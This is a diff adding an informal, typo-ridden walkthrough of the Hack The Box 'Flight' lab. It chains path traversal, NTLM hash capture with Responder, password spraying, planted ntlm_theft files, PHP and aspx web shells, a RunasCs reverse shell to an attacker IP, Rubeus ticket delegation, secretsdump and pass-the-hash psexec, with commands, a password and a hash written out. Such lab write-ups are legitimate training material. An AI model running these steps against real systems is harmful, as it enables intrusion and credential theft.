@@ -1,0 +1,65 @@
+i found  a sub domain school in it. it was running apache . so if we look in the url when we chance page we see
+
+http://school.flight.htb/index.php?view=about.html   so always look for path trnaversal adn we found C:\system.....\etc\hosts
+
+so it was confirmed path ==tranversal==.
+
+so we can do force connect with our server to get ntlm hash  http://shool../index.php?view=10.10.14.9/ddd  we get hash on responder
+
+soo we got svc_apache password . we will use lookupsids to get username then passwordspray over smb
+
+and we found 2 more account have that password
+
+we looged in smb as s moon we saw we have write permission on smb shared which means we can upload  a svc file nd get ntml for other user
+
+we used ntlm theft tool to generate all file then mput * in smb
+
+`python ==ntlm_theft.py== -g all -s 10.10.14.6 -f ddd`
+
+then on responder we got s bum password
+
+on s bum we got a web directory se we can uppload a shell and it will connect us on server
+
+we uploaded a file nc.exe and php normal backdoor
+
+and we got a shell.
+
+now we have s bum password but we got have a tty shell on windows so we are not able to log in
+
+so we used ==runasCS== to get a tty shell and it gave us shell as c bum
+
+`r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.6:443 cmd`
+
+now on internal server we see a developmwnt directory adn port 8000 was open so we fired chisel and and open localhost 8000
+
+the conent header said it was iis site powered by asp.net
+
+so we can send ==aspx== payload maybe?
+
+now we can uplaod a `aspx` shell on development folder to get a shell
+
+and we got a shell
+
+now we can get a ticket using rubeus
+
+`==rubeus==.exe tgtdeleg /nowrap`
+
+it will give a hash
+
+we saved the hash and used
+
+`==kirbi2ccache== ticket.kirbi ticket.ccache`
+
+`export KRB5CCNAME=ticket.ccache`
+
+now it gives time error so ntpdate it
+
+`sudo ==ntpdate== -s flight.htb`
+
+now using
+
+`==secretsdump==.py -k -no-pass g0.flight.htb -just-dc-user administrator`
+
+we got hash and cracked it then used ==psexc==.py to get shell..
+
+`rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c`
